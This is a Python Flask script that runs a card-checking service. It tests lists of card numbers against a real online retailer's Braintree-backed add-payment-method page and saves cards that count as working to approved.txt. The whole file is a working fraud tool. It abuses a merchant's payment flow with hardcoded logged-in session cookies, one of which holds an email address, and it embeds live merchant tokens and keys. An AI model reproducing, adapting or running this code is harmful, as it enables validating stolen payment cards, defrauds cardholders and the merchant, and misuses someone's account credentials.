import requests
import re
import base64
from bs4 import BeautifulSoup
import time
import json
import random
import urllib3
from flask import Flask, jsonify, request
import os

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Provided cookies and headers
cookies = {
    'ccid.90027420': '338975451.4479194007',
    '__attentive_id': '867b57a36c2a43a49723a253622d0b71',
    '__attentive_cco': '1756367451975',
    'checkout_continuity_service': '17451bee-de0c-4628-bbcc-b9f8b1c70c6b',
    'tracker_device': '17451bee-de0c-4628-bbcc-b9f8b1c70c6b',
    '_ga': 'GA1.1.707844073.1756367453',
    'datadome': '_g6NMCNTqAbT_vS5q3A_PA0LcuIpv4MXu0S9PZc3tMWa0RyZXSOCoNa4Dzd9XmLmcBFW20xU_2xEY6USMoEwYonwsnp4NJVqkhvDj_hJDVh9Rdx9bvvizEjW~JV~W~7x',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-12-16%2013%3A37%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.calipercovers.com%2F%3Fsrsltid%3DAfmBOoomolHA199lY0MmDGnCNIFSmBIjccHDxIwG-_hfsN1s51gw7C99%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
    'sbjs_first_add': 'fd%3D2025-12-16%2013%3A37%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.calipercovers.com%2F%3Fsrsltid%3DAfmBOoomolHA199lY0MmDGnCNIFSmBIjccHDxIwG-_hfsN1s51gw7C99%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F143.0.0.0%20Safari%2F537.36',
    'cf_clearance': 'nq5EeLmWFjzXyYqk6Nj_WenmZavmuRyZlYH1eikgPf4-1765894027-1.2.1.1-..FXcHCP_i1FqQ0d_H_tVzNb_P.hfG8mzTM_4J4FuUpj9Qk9KGbYxI8f8iUDAzX5nTWvGF6K1eqZ_qhxgzJGuohVzSt2OCvfWmC4xyIUWP9rZ55T1hhMh_WQZ6k7iBlB.Qbn_XCltC1os0F3BK_Z9x1fZmIVxmRpnzBFMQREdAm748FqdmQtjges8ay7wiSd8SFqEIpYGIp6ahe2swBY.i8TWBe3gTAayk8j0Nc_HxI',
    '_attn_': 'eyJ1Ijoie1wiY29cIjoxNzU2MzY3NDUxOTczLFwidW9cIjoxNzU2MzY3NDUxOTczLFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcIjg2N2I1N2EzNmMyYTQzYTQ5NzIzYTI1MzYyMmQwYjcxXCJ9In0=',
    '__attentive_session_id': 'a4d20dddc0784e579790423a6b4badaa',
    '_fbp': 'fb.1.1765894033680.633375564113438005',
    '__attentive_dv': '1',
    'rl_visitor_history': '9ab458c8-1d47-418e-8c87-ad9b757bf4f4',
    'sifi_user_id': 'AD0747E9722F4BB8B5AD8E90F27680A3',
    '__attentive_ss_referrer': 'https://www.google.com/',
    'yotpo_pixel': '927c87f8-49a1-477d-bf0d-8a9fe408c706',
    '_sp_ses.d8f1': '*',
    'attntv_mstore_email': 'sexkrogaandmardo@gmail.com:0',
    'wordpress_logged_in_9a06d022e5a0d800df86e500459c6102': 'sexkrogaandmardo%40gmail.com%7C1767103677%7C0DVJLa5ckLmVEhLygAhJ7xyTuMyilchvUgAFu7eNwSN%7C4657ffb7c1832f573fe9f894b9021b49d3e22e3861ecabfa3916f94646ffcd19',
    'wfwaf-authcookie-0cfc0dfc6182cc86058203ff9ed084fe': '1184700%7Cother%7Cread%7C0cc4ccf60c226cbcf0238df8a8f938af54820e3593c100893b2c8f2cc706b03e',
    '__kla_id': 'eyJjaWQiOiJaR1pqTm1GbE1qQXRZVE14WWkwME5EUTJMV0ptWldJdE1ETmlOVEk1T1RnNU16SmgiLCIkZXhjaGFuZ2VfaWQiOiIwSGFSSG1vT0tMNkdXZmVVZ3FuRTdrUnUwSDFCSjBZQTl4MWlsM2FraXRBd3lQVVlJa1hZQzNpV1RYdWdXVkxpLkt4ZFJHViJ9',
    '_gcl_au': '1.1.629388125.1765894029.1161074818.1765894054.1765894121',
    'sbjs_session': 'pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.calipercovers.com%2Fmy-account%2Fadd-payment-method%2F',
    '_uetsid': '8599a190da8811f0b19a63fb8ea6ecc1',
    '_uetvid': 'b8ea41b083e311f0a6a9476c7a9aaa91',
    '__attentive_pv': '14',
    '_sp_id.d8f1': '175519edeb71996e.1756367452.2.1765894391.1756368265',
    '_ga_9VQF57TW94': 'GS2.1.s1765894031$o2$g1$t1765894394$j2$l0$h0',
}

headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.calipercovers.com',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://www.calipercovers.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
}

def check_status(result):
    # First, check if the message contains "Reason:" and extract the specific reason
    if "Reason:" in result:
        # Extract everything after "Reason:"
        reason_part = result.split("Reason:", 1)[1].strip()

        # Check if it's one of the approved patterns
        approved_patterns = [
            'Nice! New payment method added',
            'Payment method successfully added.',
            'Insufficient Funds',
            'Gateway Rejected: avs',
            'Duplicate',
            'Payment method added successfully',
            'Invalid postal code or street address',
            'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
        ]

        cvv_patterns = [
            'CVV',
            'Gateway Rejected: avs_and_cvv',
            'Card Issuer Declined CVV',
            'Gateway Rejected: cvv'
        ]

        # Check if the extracted reason matches approved patterns
        for pattern in approved_patterns:
            if pattern in result:
                return "APPROVED", "payment method added successfully", True

        # Check if the extracted reason matches CVV patterns
        for pattern in cvv_patterns:
            if pattern in reason_part:
                return "DECLINED", "Reason: CVV", False

        # Return the extracted reason for declined cards
        return "DECLINED", reason_part, False

    # If "Reason:" is not found, use the original logic
    approved_patterns = [
        'Nice! New payment method added',
        'Payment method successfully added.',
        'Insufficient Funds',
        'Gateway Rejected: avs',
        'Duplicate',
        'Payment method added successfully',
        'Invalid postal code or street address',
        'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
    ]

    cvv_patterns = [
        'Reason: CVV',
        'Gateway Rejected: avs_and_cvv',
        'Card Issuer Declined CVV',
        'Gateway Rejected: cvv'
    ]

    for pattern in approved_patterns:
        if pattern in result:
            return "APPROVED", "payment method added successfully", True

    for pattern in cvv_patterns:
        if pattern in result:
            return "DECLINED", "Reason: CVV", False

    return "DECLINED", result, False

def check_card(cc_line):
    """Check a single credit card and return detailed response"""
    from datetime import datetime
    start_time = time.time()
    elapsed_time = 0  # Initialize elapsed_time to avoid reference error

    try:
        domain_url = "https://www.calipercovers.com"
        
        # Get fresh authorization tokens
        headers_get = headers.copy()
        headers_get['accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
        headers_get['referer'] = f'{domain_url}/my-account/payment-methods/'
        
        response = requests.get(
            f'{domain_url}/my-account/add-payment-method/',
            cookies=cookies,
            headers=headers_get,
            verify=False
        )
        
        if response.status_code == 200:
            # Get add_nonce
            add_nonce = re.findall('name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
            if not add_nonce:
                end_time = time.time()
                elapsed_time = end_time - start_time
                return {"status": "DECLINED", "response": f"Failed to get nonce (Time: {elapsed_time:.2f}s)"}

            # Get authorization token
            i0 = response.text.find('wc_braintree_client_token = ["')
            if i0 != -1:
                i1 = response.text.find('"]', i0)
                token = response.text[i0 + 30:i1]
                try:
                    decoded_text = base64.b64decode(token).decode('utf-8')
                    au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)
                    if not au:
                        end_time = time.time()
                        elapsed_time = end_time - start_time
                        return {"status": "DECLINED", "response": f"Failed to get authorization (Time: {elapsed_time:.2f}s)"}
                    au = au[0]
                except Exception as e:
                    end_time = time.time()
                    elapsed_time = end_time - start_time
                    return {"status": "DECLINED", "response": f"Error decoding token: {str(e)} (Time: {elapsed_time:.2f}s)"}
            else:
                end_time = time.time()
                elapsed_time = end_time - start_time
                return {"status": "DECLINED", "response": f"Client token not found (Time: {elapsed_time:.2f}s)"}
        else:
            end_time = time.time()
            elapsed_time = end_time - start_time
            return {"status": "DECLINED", "response": f"Failed to fetch payment page, status code: {response.status_code} (Time: {elapsed_time:.2f}s)"}

        n, mm, yy, cvc = cc_line.strip().split('|')
        if not yy.startswith('20'):
            yy = '20' + yy

        # Generate a random device session ID
        device_session_id = ''.join(random.choices('0123456789abcdef', k=32))
        correlation_id = ''.join(random.choices('0123456789abcdef', k=8)) + '-' + ''.join(random.choices('0123456789abcdef', k=4)) + '-' + ''.join(random.choices('0123456789abcdef', k=4)) + '-' + ''.join(random.choices('0123456789abcdef', k=4)) + '-' + ''.join(random.choices('0123456789abcdef', k=12))
        
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'cc600ecf-f0e1-4316-ac29-7ad78aeafccd',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                        'billingAddress': {
                            'postalCode': '10080',
                            'streetAddress': '147 street',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        headers_token = {
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        }

        response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers_token,
            json=json_data,
            verify=False
        )

        end_time = time.time()
        elapsed_time = end_time - start_time

        if response.status_code == 200:
            try:
                token_data = response.json()
                if token_data and 'data' in token_data and 'tokenizeCreditCard' in token_data['data'] and 'token' in token_data['data']['tokenizeCreditCard']:
                    token = token_data['data']['tokenizeCreditCard']['token']
                    
                    headers_submit = headers.copy()
                    headers_submit['content-type'] = 'application/x-www-form-urlencoded'

                    data = {
                        'payment_method': 'braintree_cc',
                        'braintree_cc_nonce_key': token,
                        'braintree_cc_device_data': f'{{"device_session_id":"{device_session_id}","fraud_merchant_id":null,"correlation_id":"{correlation_id}"}}',
                        'braintree_cc_3ds_nonce_key': '',
                        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/dqh5nxvnwvm2qqjh/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/dqh5nxvnwvm2qqjh"},"merchantId":"dqh5nxvnwvm2qqjh","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null,"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Bestop Premium Accessories Group","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjYxNTM1MzgsImp0aSI6IjMwZGRmMjU2LWFjYjItNDliMS04MzBiLWJlNTQ2ZjQ4YmIyYSIsInN1YiI6ImRxaDVueHZud3ZtMnFxamgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImRxaDVueHZud3ZtMnFxamgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSJdLCJvcHRpb25zIjp7fX0.y8Dkag3LKGq9zIPfqh011ssGTELzkZelKv_JqvNRmDOrFQ-p3WzhYIq2lPdONFhjv_YplmAvyR9YWPH7COGJoQ","paypalClientId":"Aanbm5zGT-CMkR5AJKJ9R0LktPqlXIozDCC53LCa23sAUwtjDAjwG3plTmG7-DjtR3cFuvp4JJ-FwV5e","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"4042552878213091679","accessToken":"access_token$production$dqh5nxvnwvm2qqjh$d9918bec102e9ab038971ac225e91fc1","environment":"production","enrichedCustomerDataEnabled":true},"paypalEnabled":true,"paypal":{"displayName":"Bestop Premium Accessories Group","clientId":"Aanbm5zGT-CMkR5AJKJ9R0LktPqlXIozDCC53LCa23sAUwtjDAjwG3plTmG7-DjtR3cFuvp4JJ-FwV5e","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"bestoppremiumaccessoriesgroup_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
                        'woocommerce-add-payment-method-nonce': add_nonce[0],
                        '_wp_http_referer': '/my-account/add-payment-method/',
                        'woocommerce_add_payment_method': '1',
                    }

                    response = requests.post(
                        f'{domain_url}/my-account/add-payment-method/',
                        cookies=cookies,
                        headers=headers_submit,
                        data=data,
                        verify=False
                    )

                    end_time = time.time()
                    elapsed_time = end_time - start_time

                    if response.status_code == 200:
                        soup = BeautifulSoup(response.text, 'html.parser')
                        error_div = soup.find('div', class_='woocommerce-notices-wrapper')
                        message = error_div.get_text(strip=True) if error_div else "Unknown error"
                        
                        status, reason, approved = check_status(message)

                        # Save approved cards to approved.txt
                        if approved:
                            with open('approved.txt', 'a', encoding='utf-8') as approved_file:
                                approved_file.write(f"""=========================
[APPROVED]

Card: {n}|{mm}|{yy}|{cvc}
Response: {reason}
Gateway: Braintree Auth
Time: {elapsed_time:.1f}s
Bot By: @FailureFr
=========================

""")

                        return {"status": status, "response": reason}
                    else:
                        return {"status": "DECLINED", "response": f"Payment submission failed, status code: {response.status_code} (Time: {elapsed_time:.2f}s)"}
                else:
                    return {"status": "DECLINED", "response": f"Invalid or missing token data (Time: {elapsed_time:.2f}s)"}
            except ValueError as e:
                return {"status": "DECLINED", "response": f"Invalid JSON response: {str(e)} (Time: {elapsed_time:.2f}s)"}
        else:
            return {"status": "DECLINED", "response": f"Tokenization failed, status code: {response.status_code} (Time: {elapsed_time:.2f}s)"}
    except Exception as e:
        end_time = time.time()
        elapsed_time = end_time - start_time
        return {"status": "DECLINED", "response": f"Error: {str(e)} (Time: {elapsed_time:.2f}s)"}

# Initialize Flask app
app = Flask(__name__)

@app.route('/gate=b3/cc=<card>', methods=['GET'])
def check_credit_card(card):
    """Endpoint to check credit card"""
    try:
        # Validate card format
        if '|' not in card:
            return jsonify({"status": "DECLINED", "response": "Invalid format. Please use: CC_NUMBER|MM|YY|CVC"}), 400
            
        # Process the card
        result = check_card(card)
        
        # Return JSON response
        return jsonify(result)
        
    except Exception as e:
        return jsonify({"status": "DECLINED", "response": f"Error: {str(e)}"}), 500

@app.route('/')
def index():
    """Home endpoint with instructions"""
    return """
    <h1>B3 Auth API</h1>
    <p>Use the endpoint: /gate=b3/cc={card}</p>
    <p>Format: CC_NUMBER|MM|YY|CVC</p>
    <p>Example: /gate=b3/cc=4111111111111111|12|25|123</p>
    """

if __name__ == '__main__':
    # Get port from environment variable or use default 5000
    port = int(os.environ.get('PORT', 5000))
    # Bind to 0.0.0.0 for external access and disable debug mode
    app.run(host='0.0.0.0', port=port, debug=False)
